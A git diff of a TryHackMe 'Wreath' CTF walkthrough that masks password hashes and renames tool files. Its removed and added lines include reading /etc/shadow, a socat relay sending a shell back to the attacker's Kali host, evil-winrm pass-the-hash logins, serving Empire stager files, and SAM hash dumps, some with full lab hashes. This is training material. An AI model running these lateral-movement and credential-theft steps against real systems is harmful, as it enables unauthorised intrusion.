@@ -10,7 +10,13 @@ categories:
 tags:
   - THM
   - CTF
-  - 
+  - Linux
+  - Windows
+  - Evil-WinRM
+  - sshuttle
+  - chisel
+  - mimikatz
+  - Empire
 ---
 
 ## Machine Information
@@ -181,7 +187,7 @@ __        __   _               _         ____   ____ _____
 \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
  \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
   \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
-  \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
                                            @MuirlandOracle
 
 [*] Server is running in SSL mode. Switching to HTTPS
@@ -248,7 +254,7 @@ Nice, already in as root. Let's do a little enumeration, first check for hashes:
 ```text
 [root@prod-serv ]# cat /etc/shadow
 cat /etc/shadow
-root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+root:$6$i9vT8tk3SoXXxK2P$>HIDDEN>6g0PxK9VqSdy47/qKXad1::0:99999:7:::
 ```
 
 With port 22 open there's a good chance we'll find SSH credentials:
@@ -681,7 +687,7 @@ Switch back to the webserver where we just added the firewall rule and copy soca
 Start socat, we want it to listen on the port we just opened which was 15999, and then pass the traffic back out a different port and on to our Kali machine where we will have a netcat listener waiting to catch the response:
 
 ```text
-[root@prod-serv tmp]# ./socat-test tcp-l:15999 tcp:10.50.94.52:1337
+[root@prod-serv tmp]# ./socat-pencer tcp-l:15999 tcp:10.50.94.52:1337
 ```
 
 Ok, that's the webserver sitting in between us passing any traffic received on port 15999 back to Kali on port 1337. Let's start our netcat listener on Kali:
@@ -827,7 +833,7 @@ Of course we don't need to crack the passwords as we can just use "pass the hash
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
-└─# evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.93.150
+└─# evil-winrm -u administrator -H 37db<HIDDEN>bbd1 -i 10.200.93.150
 
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
@@ -1112,7 +1118,7 @@ Now switch to the webserver where our first http stager is running and pull the 
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  2952  100  2952    0     0  36900      0 --:--:-- --:--:-- --:--:-- 36900
-[root@prod-serv hop-test]# unzip hop.zip 
+[root@prod-serv hop-pencer]# unzip hop.zip 
 Archive:  hop.zip
    creating: admin/
   inflating: admin/get.php           
@@ -1124,16 +1130,16 @@ Archive:  hop.zip
 Finally we need a way of getting those files to the target Gitstack server. We can use a Python or PHP http server to do this:
 
 ```text
-[root@prod-serv hop-test]# php -S 0.0.0.0:15998 &>/dev/null &
+[root@prod-serv hop-pencer]# php -S 0.0.0.0:15998 &>/dev/null &
 [2] 7216
-[root@prod-serv hop-test]# ss -tulwm | grep 15998
+[root@prod-serv hop-pencer]# ss -tulwm | grep 15998
 tcp    LISTEN  0      128        0.0.0.0:15998      0.0.0.0:*     
 ```
 
 We also need to open a port in the firewall like before, so the GitStack server can connect to us:
 
 ```text
-[root@prod-serv hop-test]# firewall-cmd --zone=public --add-port 15998/tcp
+[root@prod-serv hop-pencer]# firewall-cmd --zone=public --add-port 15998/tcp
 success
 ```
 
@@ -1202,7 +1208,7 @@ With no direct access to the PC, we need to tunnel through the GitStack server. 
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
-└─# evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.93.150 -s /opt/Empire/data/module_source/situational_awareness/network/ 
+└─# evil-winrm -u administrator -H 37db<HIDDEN>bbd1 -i 10.200.93.150 -s /opt/Empire/data/module_source/situational_awareness/network/ 
 
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
@@ -1278,8 +1284,8 @@ We need to unzip the files and prepare them for use:
 Next we upload the Windows version to the GitStack server via our currently connected Evil-WinRM session:
 
 ```text
-*Evil-WinRM* PS C:\Users\Administrator\Documents> upload chisel-test.exe
-Info: Uploading chisel-test.exe to C:\Users\Administrator\Documents\chisel-pencer.exe
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload chisel-pencer.exe
+Info: Uploading chisel-pencer.exe to C:\Users\Administrator\Documents\chisel-pencer.exe
 Data: 11397800 bytes of 11397800 bytes copied
 Info: Upload successful!
 ```
@@ -1329,7 +1335,7 @@ Now we have looked at the developement version of the website running on Thomas'
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
-└─# evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.93.150
+└─# evil-winrm -u administrator -H 37db<HIDDEN>bbd1 -i 10.200.93.150
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
@@ -1991,11 +1997,11 @@ Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corpo
 
 [*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
-Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+Administrator:500:aad3b435b51404e<HIDDEN>47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b43<HIDDEN>d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b4<HIDDEN>31b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435<HIDDEN>24566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404ee<HIDDEN>32d5f207831101f:::
 [*] Dumping cached domain logon information (domain/username:hash)
 [*] Dumping LSA Secrets
 [*] DPAPI_SYSTEM 
